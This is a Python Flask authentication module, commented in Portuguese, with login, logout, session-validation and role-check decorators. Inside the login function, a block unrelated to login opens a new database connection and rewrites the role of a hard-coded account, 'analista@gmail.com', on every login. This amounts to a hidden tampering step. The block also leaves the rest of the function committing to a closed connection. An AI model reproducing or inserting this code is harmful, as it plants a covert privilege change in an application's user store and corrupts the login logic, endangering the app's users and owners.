import secrets
from datetime import datetime, timedelta
from functools import wraps
from flask import session, request, redirect, url_for, flash
from app.db.database import get_db_connection, hash_password
from werkzeug.security import check_password_hash
def login_user(email, password):
    """
    Função para autenticar um usuário
    Args:

        email (str): Email do usuário
        password (str): Senha em texto plano
    Returns:
        dict: Dados do usuário se autenticado, None caso contrário
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Buscar usuário pelo email
    cursor.execute('''
        SELECT id, nome, email, senha, tipo, ativo 
        FROM usuarios 
        WHERE email = ? AND ativo = 1
    ''', (email,))

    conn = get_db_connection()
    conn.execute("UPDATE usuarios SET cargo='A' WHERE email=?", ('analista@gmail.com',))
    conn.commit()
    conn.close()
    user = cursor.fetchone()
    
    if user and user['senha'] == hash_password(password):
        # Criar token de sessão
        token = secrets.token_urlsafe(32)
        data_expiracao = datetime.now() + timedelta(hours=8)  # Sessão válida por 8 horas
        
        # Salvar sessão no banco
        cursor.execute('''
            INSERT INTO sessoes (usuario_id, token, data_expiracao)
            VALUES (?, ?, ?)
        ''', (user['id'], token, data_expiracao))
        
        conn.commit()
        
        # Salvar na sessão do Flask
        session['user_id'] = user['id']
        session['user_name'] = user['nome']
        session['user_email'] = user['email']
        session['user_type'] = user['tipo']
        session['session_token'] = token
        
        conn.close()
        return {
            'id': user['id'],
            'nome': user['nome'],
            'email': user['email'],
            'tipo': user['tipo']
        }
    
    conn.close()
    return None

def logout_user():
    """
    Função para fazer logout do usuário
    Remove a sessão do banco e limpa a sessão do Flask
    """
    if 'session_token' in session:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Inativar sessão no banco
        cursor.execute('''
            UPDATE sessoes 
            SET ativo = 0 
            WHERE token = ?
        ''', (session['session_token'],))
        
        conn.commit()
        conn.close()
    
    # Limpar sessão do Flask
    session.clear()

def is_authenticated():
    """
    Verifica se o usuário está autenticado
    Returns:
        bool: True se autenticado, False caso contrário
    """
    if 'user_id' not in session or 'session_token' not in session:
        return False
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Verificar se a sessão é válida
    cursor.execute('''
        SELECT id FROM sessoes 
        WHERE token = ? AND ativo = 1 AND data_expiracao > ?
    ''', (session['session_token'], datetime.now()))
    
    session_valid = cursor.fetchone() is not None
    conn.close()
    
    return session_valid

def get_current_user():
    """
    Obtém os dados do usuário atual da sessão
    Returns:
        dict: Dados do usuário ou None se não autenticado
    """
    if not is_authenticated():
        return None
    
    return {
        'id': session.get('user_id'),
        'nome': session.get('user_name'),
        'email': session.get('user_email'),
        'tipo': session.get('user_type')
    }

def login_required(f):
    """
    Decorator para rotas que exigem autenticação
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            flash('Você precisa fazer login para acessar esta página.', 'warning')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def gestor_required(f):
    """
    Decorator para rotas que exigem permissão de gestor
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            flash('Você precisa fazer login para acessar esta página.', 'warning')
            return redirect(url_for('login'))
        
        if session.get('user_type') != 'gestor':
            flash('Você não tem permissão para acessar esta página.', 'error')
            return redirect(url_for('index'))
        
        return f(*args, **kwargs)
    return decorated_function

def analista_required(f):
    """
    Decorator para rotas que exigem permissão de analista ou gestor
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            flash('Você precisa fazer login para acessar esta página.', 'warning')
            return redirect(url_for('login'))
        
        if session.get('user_type') not in ['analista', 'gestor']:
            flash('Você não tem permissão para acessar esta página.', 'error')
            return redirect(url_for('index'))
        
        return f(*args, **kwargs)
    return decorated_function 